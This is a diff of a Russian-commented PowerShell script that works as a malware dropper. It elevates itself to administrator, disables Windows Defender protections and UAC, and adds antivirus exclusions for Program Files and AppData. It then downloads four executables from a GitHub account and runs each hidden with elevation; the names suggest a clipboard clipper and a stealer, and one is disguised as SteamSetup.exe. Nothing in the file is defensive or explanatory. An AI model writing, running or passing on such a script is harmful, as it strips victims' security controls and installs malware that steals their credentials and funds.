@@ -97,31 +97,101 @@ try {
 catch {
 }
 
-      # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
-    # Запускаем 
-    Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
-    
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe    
-    # Запускаем 
-    Start-Process -FilePath "Umbralchik.exe" -WindowStyle Hidden
-    
-    # Удаляем файл через 5 секунды
-   
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "informate.exe" -WindowStyle Hidden
-     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
-    
-    
+ # --- ПРОВЕРКА АДМИНКИ ---
+$CurrentProcess = Get-Process -Id $PID
+$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
+if (-not $IsAdmin) {
+    try {
+        $psiArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$($CurrentProcess.Path)`""
+        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs -WindowStyle Hidden
+    } catch {
+        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs
+    }
+    exit
+}
 
+# --- НАСТРОЙКА СРЕДЫ ---
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
+try {
+    $processId = $PID
+    $processInfo = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId"
+    $scriptPath = Split-Path -Parent $processInfo.ExecutablePath
+} catch {
+    $scriptPath = $PSScriptRoot
+    if (-not $scriptPath) { $scriptPath = "." }
+}
+Set-Location -Path $scriptPath
 
+# --- ОТКЛЮЧЕНИЕ ЗАЩИТЫ ---
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -PUAProtection 0
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableNetworkProtection $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableTamperProtection $true
+Set-MpPreference -SubmitSamplesConsent 2
+
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
+rundll32.exe user32.dll,UpdatePerUserSystemParameters
+Stop-Process -Name explorer -Force
+Restart-Service -Name "wuauserv" -Force
+Restart-Service -Name "bits" -Force
+
+Write-Host "Исключения..."
+try {
+    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
+    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        if (Test-Path $ProgramFiles) { Add-MpPreference -ExclusionPath $ProgramFiles }
+        if (Test-Path $ProgramFilesX86) { Add-MpPreference -ExclusionPath $ProgramFilesX86 }
+        if (Test-Path $AppData) { Add-MpPreference -ExclusionPath $AppData }
+        if (Test-Path $LocalAppData) { Add-MpPreference -ExclusionPath $LocalAppData }
+        
+        if ($ProgramFilesX86 -match "Program Files $$x86$$") {
+            $updpath = $ProgramFilesX86 -replace " \$$x86$$", ""
+            if (Test-Path $updpath) { Add-MpPreference -ExclusionPath $updpath }
+        }
+    }
+} catch { }
+
+# --- БЛОК СКАЧИВАНИЯ И ЗАПУСКА (КАК ТЫ ПРОСИЛ) ---
+
+# 1. Arcanusclipper.exe
+Write-Host "Скачивание Arcanusclipper.exe..."
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+if (Test-Path "Arcanusclipper.exe") {
+    Start-Process "Arcanusclipper.exe" -Verb RunAs -WindowStyle Hidden
+}
+
+# 2. Umbralchik.exe
+Write-Host "Скачивание Umbralchik.exe..."
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+if (Test-Path "Umbralchik.exe") {
+    Start-Process "Umbralchik.exe" -Verb RunAs -WindowStyle Hidden
+}
+
+# 3. informate.exe
+Write-Host "Скачивание informate.exe..."
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+if (Test-Path "informate.exe") {
+    Start-Process "informate.exe" -Verb RunAs -WindowStyle Hidden
+}
+
+# 4. SteamSetup.exe
+Write-Host "Скачивание SteamSetup.exe..."
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -UseBasicParsing -ErrorAction SilentlyContinue
+if (Test-Path "SteamSetup.exe") {
+    Start-Process "SteamSetup.exe" -Verb RunAs -WindowStyle Hidden
+}
 
 
 
